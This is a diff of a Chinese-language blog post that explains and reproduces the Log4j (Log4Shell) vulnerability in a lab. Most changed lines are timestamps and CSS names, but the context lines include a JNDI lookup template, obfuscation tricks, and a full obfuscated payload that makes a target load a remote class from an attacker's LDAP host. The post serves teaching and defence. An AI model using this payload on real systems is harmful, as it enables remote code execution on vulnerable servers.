@@ -7,7 +7,7 @@
 <meta property="og:locale">
 <meta property="og:image" content="http://wenyunw.me/images/log4j.png">
 <meta property="article:published_time" content="2025-09-02T22:24:34.000Z">
-<meta property="article:modified_time" content="2025-09-03T05:56:47.323Z">
+<meta property="article:modified_time" content="2025-10-28T01:28:10.118Z">
 <meta property="article:author" content="Wenyun Wang">
 <meta property="article:tag" content="vulnerability">
 <meta name="twitter:card" content="summary">
@@ -58,7 +58,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2025-09-03 05:56:47'
+  postUpdate: '2025-10-28 01:28:10'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -162,7 +162,7 @@
       }
     }
     detectApple()
-    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> Note</span></a></div><div class="menus_item"><a class="site-page" href="/resume/"><i class="fa-fw fas fa-id-card"></i><span> Resume</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment"></i><span> Comment</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Wenyun Wang"><span class="site-name">Wenyun Wang</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> Note</span></a></div><div class="menus_item"><a class="site-page" href="/resume/"><i class="fa-fw fas fa-id-card"></i><span> Resume</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment"></i><span> Comment</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Log4j Exploitation and Defense(白话解释+复现)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon fas fa-history"></i><span class="post-meta-label">Updated</span><time datetime="2025-09-03T05:56:47.323Z" title="Updated 2025-09-03 05:56:47">2025-09-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Security/">Security</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Log4j Exploitation and Defense(白话解释+复现)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><hr>
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> Note</span></a></div><div class="menus_item"><a class="site-page" href="/resume/"><i class="fa-fw fas fa-id-card"></i><span> Resume</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment"></i><span> Comment</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Wenyun Wang"><span class="site-name">Wenyun Wang</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> Note</span></a></div><div class="menus_item"><a class="site-page" href="/resume/"><i class="fa-fw fas fa-id-card"></i><span> Resume</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment"></i><span> Comment</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Log4j Exploitation and Defense(白话解释+复现)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon fas fa-history"></i><span class="post-meta-label">Updated</span><time datetime="2025-10-28T01:28:10.118Z" title="Updated 2025-10-28 01:28:10">2025-10-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Security/">Security</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Log4j Exploitation and Defense(白话解释+复现)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><hr>
 <h1 id="Log4j-漏洞-大白话解释-复现"><a href="#Log4j-漏洞-大白话解释-复现" class="headerlink" title="Log4j 漏洞(大白话解释+复现)"></a>Log4j 漏洞(大白话解释+复现)</h1><h2 id="漏洞原理：为什么一个日志库能控制整个服务器？"><a href="#漏洞原理：为什么一个日志库能控制整个服务器？" class="headerlink" title="漏洞原理：为什么一个日志库能控制整个服务器？"></a>漏洞原理：为什么一个日志库能控制整个服务器？</h2><h3 id="什么是-Log4j？"><a href="#什么是-Log4j？" class="headerlink" title="什么是 Log4j？"></a>什么是 Log4j？</h3><p>想象一下，你在写日记。每天发生什么事，你都要记录下来：</p>
 <ul>
 <li>“今天小明登录了系统”</li>
@@ -181,7 +181,7 @@
 <li>然后把取回来的东西给你</li>
 </ul>
 <p>Log4j 恰好也支持 JNDI 查找：<code>$&#123;jndi:ldap://某个服务器/某个文件&#125;</code></p>
-<h3 id="漏洞的形成：信任链被破坏"><a href="#漏洞的形成：信任链被破坏" class="headerlink" title="漏洞的形成：信任链被破坏"></a>漏洞的形成：信任链被破坏</h3><style>.jcxfndxfkonz{zoom:67%;}</style><img src="/2025/09/02/log4j/log4j_attack_govcertch.jpg" class="jcxfndxfkonz" alt="log4j_attack_govcertch">
+<h3 id="漏洞的形成：信任链被破坏"><a href="#漏洞的形成：信任链被破坏" class="headerlink" title="漏洞的形成：信任链被破坏"></a>漏洞的形成：信任链被破坏</h3><style>.gpqhqlqynkbt{zoom:67%;}</style><img src="/2025/09/02/log4j/log4j_attack_govcertch.jpg" class="gpqhqlqynkbt" alt="log4j_attack_govcertch">
 
 <p><strong>正常情况下应该是这样的：</strong></p>
 <ol>
@@ -206,7 +206,7 @@
 <li>目标服务器（Ubuntu）：2.2.2.2（运行 Minecraft）</li>
 <li>防火墙：3.3.3.3</li>
 </ul>
-<style>.btilasqrendu{zoom: 50%;}</style><img src="/2025/09/02/log4j/image-20250902223922659.png" class="btilasqrendu" alt="image-20250902223922659">
+<style>.bfjxsqeydvgb{zoom: 50%;}</style><img src="/2025/09/02/log4j/image-20250902223922659.png" class="bfjxsqeydvgb" alt="image-20250902223922659">
 
 <h3 id="第一步：确认漏洞存在"><a href="#第一步：确认漏洞存在" class="headerlink" title="第一步：确认漏洞存在"></a>第一步：确认漏洞存在</h3><p><strong>攻击者操作：</strong></p>
 <ol>
@@ -264,7 +264,7 @@
 <p><strong>3. 隐藏类名：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原来：Log4jRCE</span><br><span class="line">现在：Lo$&#123;sys:NONEXIST:-g&#125;4jRCE</span><br><span class="line">解释：读取不存在的系统变量，默认返回&quot;g&quot;，拼成&quot;Log4jRCE&quot;</span><br></pre></td></tr></table></figure>
 
-<h3 id="混淆载荷攻击"><a href="#混淆载荷攻击" class="headerlink" title="混淆载荷攻击"></a>混淆载荷攻击</h3><style>.loyvtoijjpba{zoom:33%;}</style><img src="/2025/09/02/log4j/image-20250902225210809.png" class="loyvtoijjpba" alt="image-20250902225210809">
+<h3 id="混淆载荷攻击"><a href="#混淆载荷攻击" class="headerlink" title="混淆载荷攻击"></a>混淆载荷攻击</h3><style>.wcabymganuqg{zoom:33%;}</style><img src="/2025/09/02/log4j/image-20250902225210809.png" class="wcabymganuqg" alt="image-20250902225210809">
 
 <p><strong>完整的混淆载荷：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;j$&#123;::-n&#125;d$&#123;::-i&#125;:ld$&#123;date:&#x27;a&#x27;&#125;p://1.1.1.1:995/Lo$&#123;sys:NONEXIST:-g&#125;4jRCE&#125;</span><br></pre></td></tr></table></figure>
